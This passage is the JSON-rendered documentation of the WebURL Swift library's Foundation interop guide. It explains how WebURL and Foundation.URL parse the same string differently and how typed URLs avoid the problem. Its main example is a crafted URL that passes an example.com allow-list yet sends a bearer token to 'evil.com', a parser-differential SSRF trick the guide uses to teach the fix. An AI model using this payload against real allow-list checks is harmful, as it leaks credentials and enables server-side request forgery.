{"identifier":{"url":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/FoundationInterop","interfaceLanguage":"swift"},"abstract":[{"text":"Best practices when mixing URL standards","type":"text"}],"primaryContentSections":[{"content":[{"type":"heading","text":"Introduction","anchor":"Introduction","level":2},{"inlineContent":[{"text":"The WebURL package comes with a number of APIs to support using ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" values with Foundation:","type":"text"}],"type":"paragraph"},{"type":"orderedList","items":[{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"Conversion initializers."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Convert values between "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" and "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" simply by constructing the type you need."},{"type":"text","text":" "},{"type":"text","text":"These initializers verify that both types have an equivalent interpretation of the URL value."}]},{"syntax":"swift","code":["let sourceURL = WebURL(\"https:\/\/api.example.com\/foo\/bar?baz\")!","","\/\/ WebURL -> Foundation.URL","let nsURL = URL(sourceURL)  \/\/ ‚úÖ \"https:\/\/api.example.com\/foo\/bar?baz\"    ","\/\/ Foundation.URL -> WebURL","let webURL = WebURL(nsURL)  \/\/ ‚úÖ \"https:\/\/api.example.com\/foo\/bar?baz\""],"type":"codeListing"}]},{"content":[{"inlineContent":[{"type":"text","text":"Convenience wrappers."}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Make requests using "},{"code":"URLSession","type":"codeVoice"},{"type":"text","text":" directly from a "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" value, eliminating the conversion boilerplate."}],"type":"paragraph"},{"syntax":"swift","code":["\/\/ üòå Make a URLSession request using a WebURL.","let webURL = WebURL(\"https:\/\/api.example.com\/foo\/bar?baz\")!","let dataTask = URLSession.shared.dataTask(with: webURL) { data, response, error in","  \/\/ ...","}","dataTask.resume()"],"type":"codeListing"}]}]},{"type":"aside","style":"note","name":"Note","content":[{"type":"paragraph","inlineContent":[{"type":"text","text":""},{"type":"text","text":" "},{"type":"text","text":"For these APIs to be available, you must import the "},{"type":"codeVoice","code":"WebURLFoundationExtras"},{"type":"text","text":" module:"}]},{"type":"codeListing","syntax":"swift","code":["import Foundation","import WebURL","import WebURLFoundationExtras  \/\/ <--"]}]},{"inlineContent":[{"type":"text","text":"These APIs enable you to use "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" for more of your URL processing, while still supporting clients"},{"type":"text","text":" "},{"type":"text","text":"or using libraries which require "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"."}],"type":"paragraph"},{"inlineContent":[{"text":"For many applications, this will ‚Äújust work‚Äù. However, there are some subtleties you should","type":"text"},{"text":" ","type":"text"},{"text":"generally be aware of. The issues we will be discussing are, in fact, defects in URLs themselves;","type":"text"},{"text":" ","type":"text"},{"text":"and they happen in every programming language, with every URL library, and can affect the security","type":"text"},{"text":" ","type":"text"},{"text":"and robustness of your code.","type":"text"}],"type":"paragraph"},{"type":"heading","text":"URL Strings are Ambiguous","anchor":"URL-Strings-are-Ambiguous","level":2},{"inlineContent":[{"type":"text","text":"Almost all systems rely on URLs, often for vital communication with both local and remote services,"},{"type":"text","text":" "},{"type":"text","text":"or processing requests from other devices; and data extracted from URLs is often used to make security-"},{"type":"text","text":" "},{"type":"text","text":"and privacy-sensitive decisions. It may be surprising, then, to learn that "},{"inlineContent":[{"type":"text","text":"URL strings are ambiguous"}],"type":"strong"},{"type":"text","text":"."}],"type":"paragraph"},{"inlineContent":[{"text":"URL standards have been revised many times over the decades, resulting in incompatibilities.","type":"text"},{"text":" ","type":"text"},{"text":"It is difficult to ensure that all code which processes a URL string interprets it in exactly the same way and","type":"text"},{"text":" ","type":"text"},{"text":"derives the same information from it. That is particularly true of networked clients, each of which might","type":"text"},{"text":" ","type":"text"},{"text":"use entirely different languages and libraries to process URLs, but even local applications","type":"text"},{"text":" ","type":"text"},{"text":"might expose data to multiple URL parsers, perhaps in dependencies of dependencies.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Moreover, web browsers (typically one of the most important clients) have not been able to conform to "},{"type":"emphasis","inlineContent":[{"text":"any","type":"text"}]},{"type":"text","text":""},{"type":"text","text":" "},{"type":"text","text":"historical standards because they must maintain compatibility with the web. The result is a surprising amount"},{"type":"text","text":" "},{"type":"text","text":"of variety in how URL strings are actually interpreted, and occasional disagreements;"},{"type":"text","text":" "},{"type":"text","text":"and given how much we rely on URLs, that can lead to unexpected behavior and even exploitable vulnerabilities."}],"type":"paragraph"},{"inlineContent":[{"text":"Enter ","type":"text"},{"inlineContent":[{"type":"text","text":"WebURL"}],"type":"strong"},{"text":". WebURL conforms to the latest industry standard, which formally defines URL parsing","type":"text"},{"text":" ","type":"text"},{"text":"in a way that is compatible with the web platform. You should expect ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" to work exactly as your browser does.","type":"text"},{"text":" ","type":"text"},{"text":"There is even a shared test-suite between ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":", the major browsers, and other library implementations,","type":"text"},{"text":" ","type":"text"},{"text":"to help ensure consistency.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"So what kind of disagreements and vulnerabilities are we talking about? Consider the following:","type":"text"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["\/\/ Q: What is the hostname of this URL?","let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","WebURL(urlString)!.hostname  \/\/ \"example.com\"","URL(string: urlString)!.host \/\/ \"evil.com\""]},{"inlineContent":[{"text":"Chrome, Safari, Firefox, Go, Python, NodeJS, and Rust all agree with WebURL - that this identifier","type":"text"},{"text":" ","type":"text"},{"text":"points to ","type":"text"},{"code":"\"example.com\"","type":"codeVoice"},{"text":". If you paste it in your browser, that‚Äôs where it will go.","type":"text"},{"text":" ","type":"text"},{"text":"But since Foundation‚Äôs interpretation is based on an obsolete standard that is not web-compatible,","type":"text"},{"text":" ","type":"text"},{"text":"it would send a request to ","type":"text"},{"code":"\"evil.com\"","type":"codeVoice"},{"text":" instead.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"These are the sorts of differences we‚Äôre talking about - ‚Äúregular‚Äù URLs work like you‚Äôd expect, of course"},{"type":"text","text":" "},{"type":"text","text":"(again - WebURL works just like your browser; "},{"type":"strong","inlineContent":[{"text":"adopting WebURL won‚Äôt break everything","type":"text"}]},{"type":"text","text":"), but there are these"},{"type":"text","text":" "},{"type":"text","text":"little details which can and have been exploited by attackers in surprising ways. And as you can see,"},{"type":"text","text":" "},{"type":"text","text":"generally WebURL‚Äôs interpretation is the more compatible one, because it matches the web."}],"type":"paragraph"},{"type":"aside","style":"important","name":"Important","content":[{"type":"paragraph","inlineContent":[{"text":"","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Using multiple URL standards safely is a difficult problem, but in a sense it‚Äôs a problem we already live with."},{"type":"text","text":" "},{"type":"text","text":"We‚Äôve devised a few simple guidelines to help your code deal with this situation more robustly:"}]},{"type":"unorderedList","items":[{"content":[{"type":"paragraph","inlineContent":[{"text":"Store and communicate URLs using URL types. Avoid passing them around as strings.","type":"text"}]}]},{"content":[{"inlineContent":[{"text":"Each URL string should be interpreted by ","type":"text"},{"inlineContent":[{"type":"text","text":"only one"}],"type":"strong"},{"text":" parser.","type":"text"}],"type":"paragraph"}]},{"content":[{"inlineContent":[{"type":"text","text":"If you must store or communicate a URL as a string (e.g. in JSON),"},{"type":"text","text":" "},{"type":"text","text":"document which parser should be used to interpret it."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"If no parser is specified, "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" is a good default."}]}]}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"The lack of alignment in URL standards is an issue that is being actively exploited, particularly in"},{"type":"text","text":" "},{"type":"text","text":"Server-Side Request Forgery (SSRF) vulnerabilities. In the following sections, we‚Äôll discuss the above advice"},{"type":"text","text":" "},{"type":"text","text":"in more detail, including examples of actual exploits and how these practices could have avoided them."}]}]},{"type":"heading","text":"URL Types are Unambiguous","anchor":"URL-Types-are-Unambiguous","level":2},{"inlineContent":[{"type":"text","text":"The first guideline is to prefer storing and communicating URLs using URL types, rather than as strings."},{"type":"text","text":" "},{"type":"text","text":"The meaning of a plain string can be ambiguous, but a value with a type such as "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" or "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" "},{"type":"text","text":"communicates precisely how it should be interpreted, and this enables initializers which verify that semantics"},{"type":"text","text":" "},{"type":"text","text":"are maintained across a conversion."}],"type":"paragraph"},{"inlineContent":[{"text":"For example, consider the demonstration URL from the previous section. Both ","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"text":" and ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" were able","type":"text"},{"text":" ","type":"text"},{"text":"to parse the raw URL string, but saw different components from it. Now, let‚Äôs try parsing the string as a","type":"text"},{"text":" ","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"text":", and converting it to a ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":":","type":"text"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","let nsURL = URL(string: urlString)!","print(nsURL.host) \/\/ \"evil.com\"","WebURL(nsURL)     \/\/ ‚úÖ nil - URL is ambiguous"]},{"inlineContent":[{"type":"text","text":"The initializer checks that both types agree about what the URL means. In this case, they don‚Äôt,"},{"type":"text","text":" "},{"type":"text","text":"so the conversion fails. This is a "},{"type":"strong","inlineContent":[{"text":"much better outcome","type":"text"}]},{"type":"text","text":" than accidentally sending data to the wrong server!"}],"type":"paragraph"},{"inlineContent":[{"text":"Something interesting happens if we try this conversion the other way around. Parsing a URL string with ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" ","type":"text"},{"text":"also ","type":"text"},{"inlineContent":[{"type":"text","text":"normalizes"}],"type":"emphasis"},{"text":" it, so it cleans up ambiguous syntax and makes the web-compatible interpretation more obvious","type":"text"},{"text":" ","type":"text"},{"text":"to other software and systems. This means that converting a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" to a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" will almost always succeed,","type":"text"},{"text":" ","type":"text"},{"text":"even in cases where the reverse order of operations would have failed.","type":"text"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","let webURL = WebURL(urlString)!","print(webURL.hostname)  \/\/ \"example.com\"","print(webURL)           \/\/ \"http:\/\/foo%40evil.com:80@example.com\/\"","\/\/                                    ^^^","\/\/               Problematic '@' sign has been encoded by WebURL,","\/\/                  making the web-compatible interpretation","\/\/                                more obvious.","","URL(webURL)?.host  \/\/ ‚úÖ \"example.com\""]},{"inlineContent":[{"type":"text","text":"Successful conversion does "},{"type":"strong","inlineContent":[{"type":"text","text":"not"}]},{"type":"text","text":" necessarily mean that the URLs have identical strings or components."},{"type":"text","text":" "},{"type":"text","text":"The conversion initializers are based on careful study of both standards, and although they are careful"},{"type":"text","text":" "},{"type":"text","text":"not to permit different interpretations, they are lenient in certain cases when both standards allow it."}],"type":"paragraph"},{"inlineContent":[{"text":"That means they won‚Äôt get in your way rejecting irrelevant differences (many times, even a force-unwrap","type":"text"},{"text":" ","type":"text"},{"text":"would not be unreasonable), but they still catch those edge cases where there are genuine mismatches,","type":"text"},{"text":" ","type":"text"},{"text":"as we‚Äôve seen in the previous few examples.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"Here is an example of the kind of differences that are allowed. The standard used by ","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" requires","type":"text"},{"text":" ","type":"text"},{"text":"that the URL‚Äôs scheme and hostname be normalized to lowercase (","type":"text"},{"type":"codeVoice","code":"WebURL"},{"text":" has to do it; it has no choice).","type":"text"},{"text":" ","type":"text"},{"text":"Luckily, RFC-2396 (the standard used by ","type":"text"},{"type":"codeVoice","code":"Foundation.URL"},{"text":") explicitly allows that, so even if those parts","type":"text"},{"text":" ","type":"text"},{"text":"of the URL are upper\/mixed-case (perhaps the user had caps-lock on and didn‚Äôt notice), the conversion is allowed.","type":"text"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["\/\/ Foundation's components:","let nsURL = URL(string: \"HTTP:\/\/EXAMPLE.COM\/\")!","print(nsURL)         \/\/ \"HTTP:\/\/EXAMPLE.COM\/\"","print(nsURL.scheme)  \/\/ \"HTTP\"","print(nsURL.host)    \/\/ \"EXAMPLE.COM\"","","\/\/ WebURL normalizes the URL, but the meaning is preserved:","let convertedURL = WebURL(nsURL)!","print(convertedURL)           \/\/ ‚úÖ \"http:\/\/example.com\/\"","print(convertedURL.scheme)    \/\/ ‚úÖ \"http\"","print(convertedURL.hostname)  \/\/ ‚úÖ \"example.com\""]},{"inlineContent":[{"text":"This safe interoperability, which allows as much as it can but also catches real ambiguities, is only possible","type":"text"},{"text":" ","type":"text"},{"text":"because we are converting URL types rather than simply parsing the string again. In the next section, we‚Äôll discuss","type":"text"},{"text":" ","type":"text"},{"text":"applying this idea throughout your application, so it is always clear how a URL is being interpreted.","type":"text"}],"type":"paragraph"},{"type":"heading","text":"One Parser Per String","anchor":"One-Parser-Per-String","level":2},{"inlineContent":[{"text":"Consider the following program, demonstrating a simple proxy server. Here‚Äôs how it works:","type":"text"}],"type":"paragraph"},{"type":"unorderedList","items":[{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"0Ô∏è‚É£ (Not shown) A client connects to us, says ‚Äúmake a request to this URL for me, please‚Äù."}]}]},{"content":[{"inlineContent":[{"type":"text","text":"1Ô∏è‚É£ The server checks the provided URL."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"2Ô∏è‚É£ If the hostname is allowed, the server makes the request, including some private token\/key in the header."}]}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"3Ô∏è‚É£ (Not shown) The response is forwarded to the client."}]}]}]},{"inlineContent":[{"type":"text","text":"The part we‚Äôre interested in is split in to two functions - one gets a URL string and checks that it points"},{"type":"text","text":" "},{"type":"text","text":"to an approved server, and the other makes the authenticated HTTP request:"}],"type":"paragraph"},{"inlineContent":[{"inlineContent":[{"text":"Application:","type":"text"}],"type":"strong"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","  \/\/ 1. Verify host.","  guard checkHostIsAllowed(urlString) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ 2. Make request.","  return try makeAuthenticatedRequest(urlString, completionHandler: ...)","}"]},{"inlineContent":[{"inlineContent":[{"text":"Allow-List Checker:","type":"text"}],"type":"strong"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["let allowedHosts: Set<String> = [ \"example.com\", \/* ... *\/ ]","","func checkHostIsAllowed(_ urlString: \/* ‚ö†Ô∏è *\/ String) -> Bool {","  if let hostname = WebURL(urlString)?.hostname {","    return allowedHosts.contains(hostname)","  }","  return false","}"]},{"inlineContent":[{"inlineContent":[{"text":"Request Engine:","type":"text"}],"type":"strong"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["func makeAuthenticatedRequest(_ urlString: \/* ‚ö†Ô∏è *\/ String, completionHandler: <...>) throws -> URLSessionDataTask {","  guard let url = Foundation.URL(string: urlString) else {","    throw MyLibraryError.invalidURL","  }","  var request = URLRequest(url: url)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"]},{"inlineContent":[{"type":"text","text":"Each of these functions is reasonable by itself, but the effect of combining them is that a single URL string"},{"type":"text","text":" "},{"type":"text","text":"is parsed "},{"type":"strong","inlineContent":[{"type":"text","text":"twice"}]},{"type":"text","text":", each time by a different parser, and the results may not be consistent. In other words,"},{"type":"text","text":" "},{"type":"text","text":"the hostname verified by "},{"type":"codeVoice","code":"checkHostIsAllowed"},{"type":"text","text":" might "},{"type":"emphasis","inlineContent":[{"text":"not","type":"text"}]},{"type":"text","text":" be the host that "},{"type":"codeVoice","code":"makeAuthenticatedRequest"},{"type":"text","text":" actually"},{"type":"text","text":" "},{"type":"text","text":"makes a request to! üò±"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["\/\/ The call:","let task = try checkHostAndMakeRequest(\"http:\/\/foo@evil.com:80@example.com\/\")","","\/\/ What happens:","func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","","  \/\/ ‚ö†Ô∏è 'checkHostIsAllowed' parses the string using WebURL,","  \/\/     so it thinks the host is 'example.com'.","  guard checkHostIsAllowed(urlString) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ ‚ö†Ô∏è But the request function parses the string using Foundation.URL,","  \/\/    so it actually makes the request to 'evil.com' and leaks our token!","  return try makeAuthenticatedRequest(urlString, completionHandler: ...)","}"]},{"inlineContent":[{"text":"A maliciously-crafted string could exploit this difference to leak authentication tokens to the attacker‚Äôs own server;","type":"text"},{"text":" ","type":"text"},{"text":"in fact, this demonstrates ","type":"text"},{"identifier":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","isActive":true,"type":"reference"},{"text":" that was used to gain unauthorized access to internal","type":"text"},{"text":" ","type":"text"},{"text":"Google Cloud Platform accounts. Differences between modern and historic URL standards can cause security vulnerabilities,","type":"text"},{"text":" ","type":"text"},{"text":"even outside the Swift ecosystem. It‚Äôs not just a Foundation.URL or WebURL thing - it‚Äôs something ","type":"text"},{"inlineContent":[{"type":"text","text":"all developers"}],"type":"strong"},{"text":" ","type":"text"},{"text":"need to be aware of. URL libraries often do not align to the same standard, and any data derived from one parser","type":"text"},{"text":" ","type":"text"},{"text":"might be inconsistent with another parser.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"Spotting these interactions can be difficult - for instance, the functions may live in separate libraries","type":"text"},{"text":" ","type":"text"},{"text":"and you may not have access to their source code, or the URL string might be in a JSON document or XPC message.","type":"text"},{"text":" ","type":"text"},{"text":"The common feature is that URLs are communicated ","type":"text"},{"inlineContent":[{"type":"text","text":"without using a URL type"}],"type":"strong"},{"text":", so we can‚Äôt ensure that everybody","type":"text"},{"text":" ","type":"text"},{"text":"who sees the string interprets it the same way.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"We can fix the issue in this case by hoisting URL parsing out of ","type":"text"},{"code":"checkHostIsAllowed","type":"codeVoice"},{"text":" and ","type":"text"},{"code":"makeAuthenticatedRequest","type":"codeVoice"},{"text":",","type":"text"},{"text":" ","type":"text"},{"text":"and moving it in to the caller. Now, instead of passing strings around and letting each function choose its own","type":"text"},{"text":" ","type":"text"},{"text":"parser, the caller parses the string, and passes around strongly-typed URL values (in this case ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":").","type":"text"},{"text":" ","type":"text"},{"text":"Thanks to checked conversions, the receivers can safely convert to another URL type if they wish - in this case,","type":"text"},{"text":" ","type":"text"},{"code":"makeAuthenticatedRequest","type":"codeVoice"},{"text":" converts to a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" and makes the request using ","type":"text"},{"code":"URLSession","type":"codeVoice"},{"text":".","type":"text"}],"type":"paragraph"},{"inlineContent":[{"inlineContent":[{"type":"text","text":"Fixed Allow-List Checker and Request Engine:"}],"type":"strong"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["func checkHostIsAllowed(_ url: \/* ‚úÖ *\/ WebURL) -> Bool {","  if let hostname = url.hostname {","    return allowedHosts.contains(hostname)","  }","  return false","}","","func makeAuthenticatedRequest(_ url: \/* ‚úÖ *\/ WebURL, completionHandler: <...>) throws -> URLSessionDataTask {","  \/\/ ‚úÖ checked WebURL -> Foundation.URL conversion.","  guard let convertedURL = Foundation.URL(url) else {","    throw MyLibraryError.invalidURL","  }","  var request = URLRequest(url: convertedURL)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"]},{"type":"aside","style":"tip","name":"Tip","content":[{"type":"paragraph","inlineContent":[{"type":"text","text":""}]},{"type":"paragraph","inlineContent":[{"text":"We‚Äôre showing the explicit ","type":"text"},{"type":"codeVoice","code":"WebURL -> Foundation.URL"},{"text":" conversions for clarity, but WebURL also","type":"text"},{"text":" ","type":"text"},{"text":"includes convenience APIs so you can create ","type":"text"},{"type":"codeVoice","code":"URLRequest"},{"text":"s directly.","type":"text"}]},{"type":"codeListing","code":["func makeAuthenticatedRequest(_ url: WebURL, completionHandler: <...>) throws -> URLSessionDataTask {","  \/\/ ‚úÖ Create URLRequest directly from a WebURL","  var request = URLRequest(url: url)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"syntax":"swift"}]},{"inlineContent":[{"text":"Let‚Äôs see what happens now that we‚Äôve switched to using URL types rather than strings:","type":"text"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["\/\/ The call:","let task = try checkHostAndMakeRequest(\"http:\/\/foo@evil.com:80@example.com\/\")","","\/\/ What happens:","func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","","  \/\/ ‚úÖ The string is only parsed once.","  guard let url = WebURL(urlString) else {","    throw MyAppError.invalidURL","  }","  \/\/ ‚úÖ 'checkHostIsAllowed' reads the host as 'example.com'.","  guard checkHostIsAllowed(url) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ ‚úÖ Typed conversion ensures the request is really made to 'example.com' ","  return try makeAuthenticatedRequest(url, completionHandler: ...)","}"]},{"inlineContent":[{"type":"text","text":"We could even hoist URL parsing again, and make "},{"type":"codeVoice","code":"checkHostAndMakeRequest"},{"type":"text","text":" itself accept a URL value"},{"type":"text","text":" "},{"type":"text","text":"instead of a string. By applying this process repeatedly, we reduce the number of raw URL strings"},{"type":"text","text":" "},{"type":"text","text":"floating around the application, and can leverage the type system to ensure we always interpret values"},{"type":"text","text":" "},{"type":"text","text":"correctly."}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"As we‚Äôve seen, there can be subtle, security-sensitive interactions between URL parsers, but by applying"},{"type":"text","text":" "},{"type":"text","text":"some reasonable best-practices, we can get what we want: web-compatible URL parsing and operations"},{"type":"text","text":" "},{"type":"text","text":"(notice the request is made to "},{"type":"codeVoice","code":"\"example.com\""},{"type":"text","text":", not "},{"type":"codeVoice","code":"\"evil.com\""},{"type":"text","text":"), with robustly Foundation interop."},{"type":"text","text":" "},{"type":"text","text":"The guiding rule is that each "},{"type":"emphasis","inlineContent":[{"text":"string","type":"text"}]},{"type":"text","text":" should be parsed by only one parser."}],"type":"paragraph"},{"inlineContent":[{"text":"For this reason, we ","type":"text"},{"inlineContent":[{"type":"text","text":"strongly recommend"}],"type":"strong"},{"text":" that you use typed URL values and the conversion initializers","type":"text"},{"text":" ","type":"text"},{"text":"provided by ","type":"text"},{"code":"WebURLFoundationExtras","type":"codeVoice"},{"text":". For more complex situations, such as URLs in JSON documents or XPC messages,","type":"text"},{"text":" ","type":"text"},{"text":"document which parser should be used, and parse those values early or hide them behind typed APIs,","type":"text"},{"text":" ","type":"text"},{"text":"so they do not spread as plain strings.","type":"text"}],"type":"paragraph"},{"type":"heading","text":"Prefer Parsing Using WebURL","anchor":"Prefer-Parsing-Using-WebURL","level":2},{"inlineContent":[{"type":"text","text":"We‚Äôve discussed how you can use the type system to ensure safe conversions, but what about the initial step?"},{"type":"text","text":" "},{"type":"text","text":"Which URL parser should you use to turn your strings in to objects?"}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Firstly, if the developer has specified which parser to use for a URL string, "},{"type":"strong","inlineContent":[{"text":"use that parser","type":"text"}]},{"type":"text","text":"."},{"type":"text","text":" "},{"type":"text","text":"Otherwise, matching a web browser is generally a good choice, and probably a more reasonable choice"},{"type":"text","text":" "},{"type":"text","text":"than the standard used by "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":", which has been officially obsolete for several decades."}],"type":"paragraph"},{"type":"aside","style":"tip","name":"Tip","content":[{"type":"paragraph","inlineContent":[{"text":"","type":"text"},{"text":" ","type":"text"},{"text":"I know, this could all sound a bit scary; it‚Äôs complexity you didn‚Äôt ask for and would much rather do without.","type":"text"},{"text":" ","type":"text"},{"text":"I get it. But I hope this document has helped to illustrate that the status quo has serious problems,","type":"text"},{"text":" ","type":"text"},{"text":"and the complexity, annoying as it is, can be managed very well with some simple best-practices.","type":"text"}]}]},{"inlineContent":[{"type":"text","text":"Using "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" for parsing and URL manipulation comes with a lot of additional benefits:"}],"type":"paragraph"},{"type":"orderedList","items":[{"content":[{"type":"paragraph","inlineContent":[{"text":"üåç It‚Äôs web-compatible.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"Actors on the web platform should use a web-compatible parser to interpret URLs.","type":"text"},{"text":" ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" is not web-compatible. It‚Äôs as simple as that.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"WebURL behaves just like a browser does, just like JavaScript‚Äôs ","type":"text"},{"type":"codeVoice","code":"URL"},{"text":" class does, and like many other libraries do.","type":"text"},{"text":" ","type":"text"},{"text":"In fact, the ","type":"text"},{"isActive":true,"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/jsModel-swift.property","type":"reference"},{"text":" property exposes the exact JS URL API for mixed Swift\/JS","type":"text"},{"text":" ","type":"text"},{"text":"code-bases - tested to browser standards, using the same shared test suite that the major browsers use.","type":"text"}]}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"üî© It‚Äôs always normalized."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Parsing a string using "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" cleans up a lot of ambiguous or ill-formatted URLs automatically."},{"type":"text","text":" "},{"type":"text","text":"That means "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" is easier to work with, and produces URL strings which are more interoperable"},{"type":"text","text":" "},{"type":"text","text":"with other libraries and systems."}]},{"type":"paragraph","inlineContent":[{"text":"For example, when ","type":"text"},{"code":"async-http-client","type":"codeVoice"},{"text":" needs to examine a scheme from a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":"","type":"text"},{"text":" ","type":"text"},{"text":"(like ","type":"text"},{"code":"\"http\"","type":"codeVoice"},{"text":" or ","type":"text"},{"code":"\"https+unix\"","type":"codeVoice"},{"text":"), it has to remember to manually normalize it to lowercase it first -","type":"text"},{"text":" ","type":"text"},{"text":"like it does ","type":"text"},{"type":"reference","isActive":true,"identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/DeconstructedURL.swift#L45"},{"text":" and again way over ","type":"text"},{"type":"reference","isActive":true,"identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/Scheme.swift#L42"},{"text":", in another file.","type":"text"},{"text":" ","type":"text"},{"text":"SwiftPM does the same thing ","type":"text"},{"type":"reference","isActive":true,"identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/PackageCollections%2BValidation.swift#L35"},{"text":" and ","type":"text"},{"type":"reference","isActive":true,"identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/Model\/Collection.swift#L116"},{"text":" and other places.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"With WebURL, ","type":"text"},{"type":"strong","inlineContent":[{"type":"text","text":"none of that is necessary"}]},{"text":" - that boilerplate can just go. Schemes, hostnames, paths, etc","type":"text"},{"text":" ","type":"text"},{"text":"are all normalized, all the time. Even if you modify the URL and set components - it is always normalized.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"Your code becomes more predictable. For example, I noticed that some parts of DocC ","type":"text"},{"type":"reference","isActive":true,"identifier":"https:\/\/github.com\/apple\/swift-docc\/blob\/d94139a5e64e9ecf158214b1cded2a2880fc1b02\/Sources\/SwiftDocC\/Model\/TaskGroup.swift#L43-L44"},{"text":" ","type":"text"},{"text":"manually normalize schemes to lowercase - is it intentional or not? Who knows! Like most people,","type":"text"},{"text":" ","type":"text"},{"text":"they‚Äôre probably unaware that URL schemes are case-insensitive. With WebURL, they wouldn‚Äôt need to worry about it;","type":"text"},{"text":" ","type":"text"},{"text":"their code could remain straightforward but still be correct and consistent.","type":"text"}]}]},{"content":[{"inlineContent":[{"type":"text","text":"üòå Rich, expressive APIs."}],"type":"paragraph"},{"inlineContent":[{"code":"WebURL","type":"codeVoice"},{"type":"text","text":"‚Äòs "},{"code":".pathComponents","type":"codeVoice"},{"type":"text","text":" and "},{"code":".formParams","type":"codeVoice"},{"type":"text","text":" properties give you efficient access to the URL‚Äôs path and query."},{"type":"text","text":" "},{"type":"text","text":"The "},{"code":".pathComponents","type":"codeVoice"},{"type":"text","text":" view conforms to "},{"code":"BidirectionalCollection","type":"codeVoice"},{"type":"text","text":", so you have immediate access to a huge number of"},{"type":"text","text":" 